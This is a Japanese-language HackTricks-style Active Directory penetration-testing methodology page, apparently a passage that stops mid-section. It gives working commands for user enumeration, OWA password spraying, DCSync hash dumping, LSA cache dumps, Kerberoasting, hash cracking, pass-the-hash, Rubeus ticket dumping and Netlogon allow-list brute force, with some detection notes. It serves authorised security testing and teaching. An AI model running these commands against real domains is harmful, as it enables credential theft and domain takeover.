# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤となるテクノロジーであり、**ネットワーク管理者**がネットワーク内の**ドメイン**、**ユーザー**、**オブジェクト**を効率的に作成・管理できるようにします。拡張性を考慮して設計されており、多数のユーザーを管理しやすい**グループ**や**サブグループ**にまとめ、さまざまなレベルで**アクセス権**を制御できます。

**Active Directory** の構造は、主に**ドメイン**、**ツリー**、**フォレスト**の3つの階層で構成されます。**ドメイン**は、共通のデータベースを共有する**ユーザー**や**デバイス**などのオブジェクトの集合です。**ツリー**は、共通の構造で結び付けられたドメインのグループであり、**フォレスト**は、**信頼関係**によって相互接続された複数のツリーの集合で、組織構造の最上位層にあたります。各階層で、特定の**アクセス権**と**通信権限**を設定できます。

**Active Directory** の主な概念は次のとおりです。

1. **ディレクトリ** – Active Directory オブジェクトに関するすべての情報を格納します。
2. **オブジェクト** – ディレクトリ内のエンティティを指し、**ユーザー**、**グループ**、**共有フォルダー**などが含まれます。
3. **ドメイン** – ディレクトリオブジェクトを格納するコンテナーです。1つの**フォレスト**内に複数のドメインを共存させ、それぞれ独自のオブジェクトの集合を維持できます。
4. **ツリー** – 共通のルートドメインを共有するドメインのグループです。
5. **フォレスト** – Active Directory の組織構造の最上位で、複数のツリーと、それらの間の**信頼関係**で構成されます。

**Active Directory Domain Services (AD DS)** は、ネットワーク内の集中管理と通信に不可欠なさまざまなサービスを提供します。これらのサービスには次のものがあります。

1. **ドメインサービス** – データを一元的に保存し、**認証**や**検索**など、**ユーザー**と**ドメイン**間のやり取りを管理します。
2. **証明書サービス** – 安全な**デジタル証明書**の作成、配布、管理を行います。
3. **Lightweight Directory Services** – **LDAP プロトコル**を使用するディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – 1回のセッションで複数のWebアプリケーションにわたってユーザーを認証する**シングルサインオン**機能を提供します。
5. **Rights Management** – 著作権のあるコンテンツの不正な配布や使用を制限し、保護を支援します。
6. **DNS Service** – **ドメイン名**の解決に不可欠です。

詳しい説明については、[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)を確認してください。

### **Kerberos Authentication**

**AD を攻撃する**方法を学ぶには、**Kerberos 認証プロセス**を十分に**理解する**必要があります。\
[**仕組みがまだわからない場合は、このページを読んでください。**](kerberos-authentication.md)

## チートシート

[https://wadcoms.github.io/](https://wadcoms.github.io) には、AD の列挙や悪用に使えるコマンドがまとめられており、すぐに確認できます。

> [!WARNING]
> Kerberos 通信では通常、クライアントが正しい SPN のチケットを取得できるように、**完全修飾ドメイン名 (FQDN)** が必要です。マシンへのアクセスに IP アドレスを使用すると、多くの場合 Kerberos ではなく NTLM にフォールバックします。

## Active Directory の Recon（認証情報/セッションなし）

AD 環境にアクセスできても、認証情報やセッションがない場合は、次のことができます。

- **ネットワークをPentestする:**
  - ネットワークをスキャンしてマシンと開いているポートを見つけ、**脆弱性の悪用**や認証情報の**抽出**を試みます（たとえば、[プリンターは非常に興味深いターゲットになることがあります](ad-information-in-printers.md)）。
  - DNS を列挙すると、Web、プリンター、共有、VPN、メディアなど、ドメイン内の主要なサーバーに関する情報が得られる場合があります。
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 詳しくは、一般的な[**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)を確認してください。
- **smb サービスで null アクセスと Guest アクセスを確認する**（最新の Windows バージョンでは機能しません）:
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB サーバーの列挙方法について詳しくは、こちらを参照してください。


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP を列挙する**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP の列挙方法について詳しくは、こちらを参照してください（**anonymous access**に特に注意してください）:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **ネットワークを Poison する**
  - [**Responder でサービスになりすます**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ことで認証情報を収集する
  - [**relay attack を悪用する**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)ことでホストにアクセスする
  - [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)で偽の UPnP サービスを**公開**し、認証情報を収集する
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - 内部文書、ソーシャルメディア、ドメイン環境内のサービス（主にWeb）、および公開情報からユーザー名や氏名を抽出します。
  - 会社の従業員のフルネームがわかった場合は、さまざまな AD の**ユーザー名規則 (**[**こちらを参照**](https://activedirectorypro.com/active-directory-user-naming-convention/))を試せます。一般的な規則は次のとおりです: _NameSurname_, _Name.Surname_, _NamSur_（それぞれ3文字）, _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_、_ランダムな英字3文字と数字3桁_（abc123）。
  - ツール:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### ユーザー列挙

- **匿名 SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html)と[**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md)のページを確認してください。
- **Kerbrute enum**: **無効なユーザー名が要求される**と、サーバーは**Kerberos エラー**コード _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を返します。これにより、ユーザー名が無効であることを判別できます。**有効なユーザー名**の場合、**AS-REP の TGT**が返されるか、ユーザーに事前認証が必要であることを示すエラー _KRB5KDC_ERR_PREAUTH_REQUIRED_ が返されます。
- **MS-NRPC に対する認証なし**: ドメインコントローラー上の MS-NRPC (Netlogon) インターフェースに対して、auth-level = 1（認証なし）を使用します。この手法では、MS-NRPC インターフェースにバインドした後、`DsrGetDcNameEx2` 関数を呼び出し、認証情報なしでユーザーまたはコンピューターの存在を確認します。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) ツールは、この種の列挙を実装しています。調査内容は[こちら](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>で確認できます。

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

ネットワーク内でこのようなサーバーを見つけた場合、**user enumeration**も実行できます。たとえば、[**MailSniper**](https://github.com/dafthack/MailSniper)を使用できます。

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> ユーザー名のリストは[**この github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)や、こちらの ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) から入手できます。
>
> ただし、事前に行っておくべき recon の段階で、**会社で働く人々の名前**を把握しておく必要があります。名前と姓が分かれば、スクリプト [**namemash.py**](https://gist.github.com/superkojiman/11076951) を使って、有効な可能性のあるユーザー名を生成できます。

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DC に **Zerologon** のパッチを適用した後も、明示的に allow-list に登録されたアカウントは、**レガシーで脆弱な Netlogon secure-channel の動作**によって依然として危険にさらされる可能性があります。リスクのある構成は、GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** または対応するレジストリ値 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** です。

この値は **SDDL security descriptor** です（[Security Descriptors](security-descriptors.md) を参照）。DACL 内の該当する ACE が許可されたアカウントやグループは、攻撃対象になり得ます。たとえば、`O:BAG:BAD:(A;;RC;;;WD)` は実質的に **Everyone** を allow-list に登録します。

実際のオペレーターのワークフロー:

1. **SYSVOL/GPO** と **稼働中の DC のレジストリ**の両方を確認し、allow-list に登録されたプリンシパルを特定します。
2. SDDL 内の SID を実際の AD ユーザーやコンピューターに解決し、**DC のマシンアカウント**、**trust アカウント**、その他の特権を持つマシンを優先します。
3. allow-list に登録されたアカウントとして、**MS-NRPC / Netlogon authentication** を繰り返し試みます。
4. 推測に成功したら、**Netlogon password-setting** を悪用して対象アカウントのパスワードをリセットします（公開 PoC では空文字列に設定します）。<sup>[[9]](#references)[[10]](#references)</sup>

公開 artifact に基づく簡単なトリアージ / ラボの例:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes:

- **scanner**が有用なのは、有効なallow-listが**SYSVOL**、**registry**、またはその両方に存在する可能性があるためです。
- 脆弱なアカウントを特定した後は、**Domain Admin privilegesを必要としない**ため、exploit path自体が重要です。
- `DC$`などの**Domain Controller machine account**の侵害は特に危険です。そのパスワードをリセットすると、より広範な**AD takeover**への道が直接開かれる可能性があります。
- **Brute-forceの実現可能性**はモードによって異なります。公開されているartifactでは、meet-in-the-middle方式、別のコンピューターアカウントが利用できる場合の**24-bit** brute force、およびより低速な**32-bit**方式が説明されています。

Detection / hardening notes:

- allow-list policyを監査し、一時的かつ明示的に必要な互換性例外以外はすべて削除してください。
- DCの**System**イベント**5827/5828/5829/5830/5831**を監視し、脆弱なNetlogon接続が拒否、検出、またはpolicyで明示的に許可されたことを把握してください。
- レガシー依存関係が解消されるまでは、`VulnerableChannelAllowList`内のアカウントを**high-risk**として扱ってください。

### Knowing one or several usernames

有効なusernameはすでに判明しているものの、passwordがない場合は、次を試してください。

- [**ASREPRoast**](asreproast.md): ユーザーに_DONT_REQ_PREAUTH_属性が**設定されていない**場合、そのユーザーの**AS_REP messageを要求**できます。このメッセージには、ユーザーのpasswordから導出された値で暗号化されたデータが含まれます。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに、**最も一般的なpassword**を試してください。弱いpasswordを使っているユーザーがいるかもしれません（password policyに注意してください）。
  - OWA serversにも**spray**して、ユーザーのメールサーバーへのアクセスを試みることができます。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

ネットワーク上のプロトコルを**poisoning**することで、クラック可能なchallenge **hashes**を**取得**できる場合があります。


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directoryのenumerationによって、usernames、email identifiers、naming patterns、候補となるhosts、認証を強制できる可能性のあるservicesがわかります。その情報を使って、有効なNTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)と、AD環境へ侵入する潜在的な経路を特定してください。

### NetExec workspace-driven recon & relay posture checks

- **`nxcdb` workspaces**を使って、engagementごとにAD reconの状態を管理します。`workspace create <name>`を実行すると、`~/.nxc/workspaces/<name>`以下にprotocolごとのSQLite DB（smb/mssql/winrm/ldapなど）が作成されます。`proto smb|mssql|winrm`で表示を切り替え、`creds`で収集したsecretsを一覧表示します。作業後は、機密データを手動で削除してください: `rm -rf ~/.nxc/workspaces/<name>`。<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`**でサブネットを素早く検出すると、**domain**、**OS build**、**SMB signing requirements**、**Null Auth**がわかります。(signing:False)と表示されるメンバーは**relay-prone**ですが、DCでは多くの場合signingが必須です。
- NetExecの出力から直接**/etc/hosts内のhostnames**を生成して、targetingを容易にします:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- signing によって **SMB relay to the DC is blocked** されている場合も、**LDAP** の状態を確認します。`netexec ldap <dc>` で `(signing:None)` や弱い channel binding が分かります。SMB signing が必須でも LDAP signing が無効な DC は、**SPN-less RBCD** などの悪用に対する有効な **relay-to-LDAP** ターゲットです。

### クライアント側プリンターからの認証情報漏えい → ドメイン認証情報の一括検証

- プリンターやWeb UIの中には、マスクされた管理者パスワードをHTMLに**埋め込んでいる**ものがあります。ソースや開発者ツールを確認すると、平文（例：`<input value="<password>">`）が見つかり、Basic-authでスキャン／印刷リポジトリにアクセスできる場合があります。
- 取得した印刷ジョブに、ユーザーごとのパスワードが記載された**平文のオンボーディング資料**が含まれていることがあります。検証時は、対応関係を維持してください：<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM Creds の窃取

**null user または guest user**で**他の PC や共有にアクセス**できる場合、ファイル（SCF ファイルなど）を**配置**できます。そのファイルが何らかの方法でアクセスされると、あなたに対する NTLM 認証を**発生させ**、解析用の**NTLM challenge**を**窃取**できる可能性があります:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**では、すでに持っている各 NT hash を、NT hash から直接鍵素材が導出される、より遅い別形式の候補パスワードとして扱います。Kerberos RC4 ticket、NetNTLM challenge、cached credential の長い passphrase を brute-force する代わりに、NT hash を Hashcat の NT-candidate mode に渡し、平文を知らなくてもパスワードの再利用を検証できます。ドメイン侵害後など、現在および過去の NT hash を何千件も収集できる状況では特に効果的です。<sup>[[5]](#references)</sup>

次のような場合に shucking を使います:

- DCSync、SAM/SECURITY dump、credential vault から NT hash のコーパスを取得し、他の domain/forest での再利用を調べたい場合。
- RC4 ベースの Kerberos データ（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM response、または DCC/DCC2 blob を取得した場合。
- 解読不可能な長い passphrase の再利用をすばやく確認し、ただちに Pass-the-Hash で pivot したい場合。

この technique は、鍵が NT hash ではない暗号化タイプ（Kerberos etype 17/18 AES など）には**使えません**。ドメインで AES のみが強制されている場合は、通常の password mode に切り替える必要があります。

#### NT hash コーパスの作成

- **DCSync/NTDS** – `secretsdump.py` で password history も含めて取得し、可能な限り多くの NT hash（および過去の値）を集めます:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  History entries は候補プールを大幅に広げます。Microsoft はアカウントごとに最大24個の以前のハッシュを保存できるためです。NTDS secrets を収集する方法については、以下を参照してください。

{{#ref}}
dcsync.md
{{#endref}}

- **エンドポイントのキャッシュダンプ** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（または Mimikatz の `lsadump::sam /patch`）で、ローカルの SAM/SECURITY データとキャッシュされたドメインログオン（DCC/DCC2）を抽出します。重複を除去し、それらのハッシュを同じ `nt_candidates.txt` リストに追加します。
- **メタデータの追跡** – 各ハッシュを生成したユーザー名/ドメインを記録します（ワードリストに16進数しか含まれていない場合も同様）。Hashcat が候補を見つけたとき、一致したハッシュから、どのプリンシパルがパスワードを再利用しているかがすぐにわかります。
- shucking 時の重複の可能性を高めるため、同じフォレストまたは信頼関係のあるフォレストの候補を優先します。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意:

- NT-candidate の入力は**生の32桁の16進数のNTハッシュのままにする必要があります**。ルールエンジンを無効にしてください（`-r` やハイブリッドモードは使用しない）。加工によって候補のキー素材が破損するためです。
- これらのモード自体が高速なわけではありませんが、NTLM のキー空間（M3 Max で約30,000 MH/s）は Kerberos RC4（約300 MH/s）の約100倍の速度です。厳選したNTリストを試すほうが、低速な形式でパスワード空間全体を探索するより、はるかに低コストです。
- **最新の Hashcat build**（`git clone https://github.com/hashcat/hashcat && make install`）を必ず使用してください。モード31500/31600/35300/35400は最近追加されました。<sup>[[7]](#references)</sup>
- AS-REQ Pre-Auth 用のNTモードは現在ありません。また、AES etype（19600/19700）では、生のNTハッシュではなく、UTF-16LEパスワードからPBKDF2でキーを導出するため、平文パスワードが必要です。

#### 例 – Kerberoast RC4 (mode 35300)

1. 権限の低いユーザーで、対象SPNのRC4 TGSを取得します（詳細は Kerberoast のページを参照）:

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. NT listを使ってチケットをShuckする:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat は各 NT 候補から RC4 key を導出し、`$krb5tgs$23$...` blob を検証します。一致すれば、そのサービスアカウントが既存の NT hash のいずれかを使用していることが確認できます。

3. ただちに PtH で pivot します:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   必要であれば、後で `hashcat -m 1000 <matched_hash> wordlists/` を使って平文を復元できます。

#### 例 – キャッシュされた認証情報（mode 31600）

1. 侵害されたワークステーションからキャッシュされたログオン情報をダンプします：

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. 注目すべきドメインユーザーの DCC2 行を `dcc2_highpriv.txt` にコピーし、shuck します:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. 一致が成功すると、リスト内ですでに把握している NT hash が得られ、キャッシュされたユーザーがパスワードを再利用していることが証明されます。そのまま PtH に使うか（`nxc smb <dc_ip> -u highpriv -H <hash>`）、高速な NTLM モードで brute-force してパスワード文字列を復元します。

同じワークフローは NetNTLM challenge-response（`-m 27000/27100`）と DCC（`-m 31500`）にも適用できます。一致を特定したら、relay、SMB/WMI/WinRM PtH を実行するか、マスクやルールを使ってオフラインで NT hash を再解析できます。



## 資格情報/セッションありでの Active Directory 列挙

このフェーズでは、**有効なドメインアカウントの資格情報またはセッションを侵害している必要があります。** 有効な資格情報を持っている場合や、ドメインユーザーとしてシェルを取得している場合は、**先に挙げた手法も、他のユーザーを侵害するための選択肢として引き続き利用できることを忘れないでください。**

認証済みの列挙を始める前に、**Kerberos のダブルホップ問題**を理解してください。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 列挙

アカウントの侵害は、**ドメインの評価に向けた大きな一歩**です。認証済みの **Active Directory 列挙**が可能になります。

[**ASREPRoast**](asreproast.md) については、脆弱な可能性のあるユーザーをすべて特定できます。また、[**Password Spraying**](password-spraying.md) については、**すべてのユーザー名のリスト**を取得し、侵害したアカウントのパスワード、空のパスワード、新たに有望と思われるパスワードを試せます。

- [**基本的な偵察を行うための CMD**](../basic-cmd-for-pentesters.md#domain-info)を使用できます。
- よりステルス性の高い[**偵察用の PowerShell**](../basic-powershell-for-pentesters/index.html)も使用できます。
- [**powerview を使用**](../basic-powershell-for-pentesters/powerview.md)して、さらに詳細な情報を抽出することもできます。
- Active Directory の偵察に使えるもう一つの優れたツールは[**BloodHound**](bloodhound.md)です。（使用する収集方法によりますが）**あまりステルス性はありません**。ただし、**それを気にしない**のであれば、ぜひ試してみてください。ユーザーがどこに RDP できるか、他のグループへの経路などを確認できます。
  - **その他の自動 AD 列挙ツール:** [**AD Explorer**](bloodhound.md#ad-explorer)**、**[**ADRecon**](bloodhound.md#adrecon)**、**[**Group3r**](bloodhound.md#group3r)**、**[**PingCastle**](bloodhound.md#pingcastle)**。**
- 興味深い情報が含まれている可能性がある[**AD の DNS レコード**](ad-dns-records.md)。
- ディレクトリの列挙には、**SysInternal** Suite の **AdExplorer.exe** という **GUI ツール**も使用できます。
- **ldapsearch** で LDAP データベースを検索し、_userPassword_ や _unixUserPassword_ フィールド、またはユーザーの _description_ や _info_ のメモに資格情報がないか確認することもできます。_info_ にある、ラベルのないパスワードらしき文字列は、候補にすぎません。その用途と有効性は別途確認し、通常の列挙出力にメモの内容を含めないでください。他の手法については、PayloadsAllTheThings の [AD ユーザーコメント内のパスワード](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)を参照してください。
- 権限がある場合は、`\\<dc>\NETLOGON` または `\\<dc>\SYSVOL\<domain>\scripts` にある、アクセス可能なドメインログオンスクリプトやドライブマッピングスクリプトを確認してください。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller)では、NETLOGON 共有がスクリプトディレクトリとして果たす役割について説明されています。まずファイル名を一覧表示し、その後、関連性があり、読み取り可能で、サイズ制限内のスクリプトだけを確認してください。共有全体をダンプしたり、通常の列挙中に資格情報の値を出力したりしないでください。PowerShell の [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) 呼び出しでは、スクリプトに保存された平文のパスワードは**保護されません**。この呼び出しだけでは、シークレットがハードコードされているとは断定できません。実際の入力を追跡したうえで、アカウント、資格情報の有効性、権限をそれぞれ別途確認してください。ドメインスクリプトの確認はリモート共有の調査であり、ローカルホストの列挙とは別です。
- **Linux** を使用している場合は、[**pywerview**](https://github.com/the-useless-one/pywerview) でドメインを列挙することもできます。
- 次のような自動化ツールも試せます。
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **ドメインユーザーをすべて抽出する**

  Windows では、すべてのドメインユーザー名を簡単に取得できます（`net user /domain`、`Get-DomainUser`、または `wmic useraccount get name,sid`）。Linux では、次のコマンドを使用できます。`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` または `enum4linux -a -u "user" -p "password" <DC IP>`

> この列挙セクションは短く見えるかもしれませんが、全体の中で最も重要な部分です。リンク（特に cmd、powershell、powerview、BloodHound のリンク）を開き、ドメインの列挙方法を学び、慣れるまで練習してください。評価の実施中、ここが DA への道筋を見つける鍵となる場面、または何もできないと判断する場面になります。

### 予測可能な事前作成コンピューターアカウント -> gMSA パスワードへのアクセス

レガシーなドメイン参加のために準備されたコンピューターアカウントには、予測可能な初期パスワードが残っていることがあります。NetExec の `pre2k` モジュールは、特徴的な `userAccountControl` 値 `4128`（`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`）を特定し、末尾の `$` を除いたコンピューター名の小文字表記の先頭14文字を使って Kerberos TGT の取得を試みます。この UAC 値は候補の選別に使うものであり、**Pre-Windows 2000 Compatible Access** のメンバーであることだけを根拠に、パスワードが弱いと決めつけないでください。<sup>[[18]](#references)[[20]](#references)</sup>

認証済みの LDAP 列挙を使って候補を検証し、TGT の取得に成功したものを保存してください。`ALL=True` を指定すると、既定の `4128` フィルターに該当するオブジェクト以外も検証対象に含まれます。<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

デフォルト/NTLM bind に失敗しても、この finding が無効になるわけではありません。`-k`、DC に名前解決される FQDN、KDC と同期した時計を使ってテストしてください。モジュールの実行に成功すると、候補リストと取得した ccaches が `~/.nxc/modules/pre2k/` 以下に書き込まれます。<sup>[[18]](#references)[[20]](#references)</sup>

コンピュータプリンシパルを侵害した後は、そのネストされたグループメンバーシップと外向きの権限をグラフ化してください。特に、gMSA の `msDS-GroupMSAMembership` セキュリティ記述子に記載されたプリンシパルは、`msDS-ManagedPassword` を読み取ることができます。認証を行うコンピュータに権限がある場合、NetExec の `--gmsa` 出力には許可されたプリンシパルが表示され、現在の NT hash が返されます。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

その後、回収した gMSA を他の認証情報と同様に評価します。ローカルおよびドメインのグループメンバーシップ、ログオン権限、SPN、委任、アクセス可能なサービスを調べてから、pass-the-hash を試してください。この ACL ベースの取得経路は、KDS root-key の侵害後に管理パスワードを導出する [Golden gMSA/dMSA](golden-dmsa-gmsa.md) とは別のものです。<sup>[[20]](#references)</sup>

コンピューターのプリンシパルが、他のコンピューターオブジェクトやグループに対する送信方向の制御権を持つ場合もあります。プリンシパルを取得したら、ネストされたメンバーシップと実効 ACL を個別に調べてください。別のコンピューターオブジェクトに対する書き込み権限があればアカウントを変更できる場合があり、グループメンバーシップの権限がログオン権限につながる場合もあります。ステージングアカウントのフラグ、予測可能な命名規則、または `GenericWrite` のエッジだけでは、攻撃経路全体が成立する証拠にはなりません。

ファイル、共有、バックアップ内にある `msDS-ManagedPassword` blob の読み取り可能なコピーは、別の漏えい経路です。LDAP の読み取り ACL では、別の場所に保存されたコピーを保護できません。解釈する前に、データが管理パスワードの blob であることを確認し、認可された LDAP 読み取りや KDS root-key からの導出とは区別してください。

### Kerberoast

Kerberoasting では、ユーザーアカウントに紐づくサービスが使用する **TGS tickets** を取得し、その暗号化を **オフライン** でクラックします。暗号化にはユーザーパスワードが使われます。

詳細については、以下を参照してください。


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

認証情報を入手したら、いずれかの **machine** にアクセスできるか確認してください。その際、ポートスキャンの結果に応じて、**CrackMapExec** を使い、複数のサーバーへの接続を異なるプロトコルで試すことができます。

### Local Privilege Escalation

侵害した認証情報または通常のドメインユーザーとしてのセッションを持ち、ドメイン内の **いずれかの machine** にアクセスできる場合は、**ローカルで権限を昇格して認証情報を収集する** 方法を探してください。ローカル管理者権限があれば、メモリ（LSASS）やローカルストレージ（SAM）から**他のユーザーのハッシュをダンプ**できる場合があります。

この本には、[**Windows のローカル権限昇格**](../windows-local-privilege-escalation/index.html)に関するページと[**チェックリスト**](../checklist-windows-privilege-escalation.md)があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) の使用も忘れないでください。

### Current Session Tickets

現在のユーザーの **tickets** に、予期しないリソースへの**アクセス権限を与えるものが含まれている可能性は非常に**低いですが、確認することはできます。

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

ドメインの認証情報またはユーザーセッションを取得したら、NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)を再検討しましょう。認証済みの列挙や認証強制の手法を使うと、認証なしの偵察では見つからなかったrelayの経路が明らかになることがあります。

### コンピューターの共有フォルダー | SMB共有から認証情報を探す

基本的な認証情報を入手したので、AD内で共有されている**興味深いファイルを見つけられるか**確認しましょう。手作業でもできますが、非常に退屈で反復的な作業になります（確認が必要な文書が何百件も見つかった場合は、なおさらです）。

[**使用できるツールについては、このリンクを参照してください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Credsを盗む

**他のPCや共有フォルダーにアクセスできる**場合、ファイル（SCFファイルなど）を**配置**できます。そのファイルが何らかの方法で開かれると、あなたに対してNTLM認証を**発生させる**ことができ、**NTLM challenge**を**盗んで**クラックできます。


{{#ref}}
